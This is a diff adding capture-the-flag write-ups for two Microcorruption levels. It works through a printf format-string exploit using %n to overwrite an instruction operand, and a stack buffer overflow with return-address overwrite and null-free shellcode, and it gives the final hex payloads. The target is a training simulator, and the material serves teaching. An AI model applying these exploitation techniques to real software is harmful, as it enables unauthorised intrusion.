@@ -469,15 +469,159 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017fa0a1a2a3a4a5a6a7a8a9a0aaabacadaeafb0b1b2b3
 cccccccccccccccccccccccccccccccccc
 ```
 
-# Writeups in progress:
-
 
 ## 9.  Addis Ababa
 
+This is the first one with printf--it requests our username/password
+combo as one string of the form `username:password` and will printf
+this back to us.  This string is not sanitised in any way.
 
+Just before the call to printf, the stack looks like:
+
+```
+3ff0:   0024 f43f 0024 0000 fc3f 0000 6161 6161   .$.?.$...?..aaaa
+4000:   6161 6161 613a 6262 6262 6262 6200 0000   aaaaa:bbbbbbb...
+```
+
+and the stack pointer is at 3ff8.
+
+Thus the first argument to printf--the address of the format string
+(3ffc)--is at the stack pointer.  Any further `%x` or similar inputs
+are going to pop more data off the stack, then.  The stack looks like:
+
+```
+3ffc
+0000
+[first word of format string]
+[second word of format string]
+[third word of format string]
+```
+
+Therefore, if the format string consists of the following words:
+
+```
+[address]
+%x
+%n
+```
+
+Then the following will happen:
+
+* The address will be printed (whatever it is)
+
+* The %x will pop off the 0000 from the stack, leaving `[address]` at
+  the top of the stack
+
+* The %n will cause a number to be written to `[address]`.
+  Specifically, that number will be the count of characters printed
+  thus far.  So it will be some small integer.
+
+So we can get a small integer written to any address we want.  So what
+address will we overwrite?  Looking immediately after the printf, we
+have the code snippet:
+
+```
+447c:  b012 c845      call	#0x45c8 <printf>
+4480:  2153           incd	sp
+4482:  3f40 0a00      mov	#0xa, r15
+4486:  b012 5045      call	#0x4550 <putchar>
+448a:  8193 0000      tst	0x0(sp)
+448e:  0324           jz	#0x4496 <main+0x5e>
+4490:  b012 da44      call	#0x44da <unlock_door>
+4494:  053c           jmp	#0x44a0 <main+0x68>
+```
+
+We see the test instruction at 448a is the one used to determine
+whether to unlock or not.  If we change the offset at 448c, then the
+instruction will become, e.g. `tst 0x2(sp)`, which may not be zero.
+Indeed, sp will be 3ffa at this point, so sp+(a small integer) will be
+within our format string most likely, so nonzero.  
+
+Thus the format string should be:
+
+```
+448c
+%x
+%n
+```
+
+The answer, therefore, is just:
+
+```
+8c442578256e
+```
 
 ## 10. Montevideo
 
+This seems like a straightforward buffer overflow.  The usual
+procedure would be:
+
+* Fill the buffer with as many As as possible (0x30 is the limit).
+
+* Break on the ret instruction of the function in which the As were
+  placed in memory (address 0x4548).
+
+* See which As are going to be placed into PC (the ones after the
+  first 16 As).
+
+* Replace those with the address of the code we'd like to return to.
+
+In this case, there is no `unlock_door` function to return to.
+However, there is the call to the `INT` function that we can return
+to.  And since we can write to the stack, we can simulate that the
+value `7f` was pushed onto the stack just before this call.  Thus we
+will go for a buffer of the form:
+
+```
+{16 bytes of padding}{Address of call INT (e.g. 4460)}{007f}
+```
+
+Thus:
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa60447f00
+```
+
+Worth mentioning also is that, if we wanted a shorter input, we could place the assembled code:
+
+```
+3012 7f00   push 0x7f
+b012 4c45   call INT
+```
+
+And then use the address of the start of the input (0x43ee) as the return address:
+
+```
+{code to unlock door}{padding to length 16}{43ee}
+```
+
+Or:
+
+```
+30127f00b0124c45aaaaaaaaaaaaaaaaee43
+```
+
+The problem is that this assembled code has a null byte, so we need to modify it so that it doesn't.  For example: 
+
+```
+mov #0x7f01,r15
+dec r15
+swpb r15
+push r15
+call #0x454c
+```
+
+```
+3f40017f1f838f100f12b0124c45
+```
+
+For a total answer of:
+
+```
+3f40017f1f838f100f12b0124c45aaaaee43
+```
+
+# Writeups in progress:
 
 
 ## 11. Jakarta
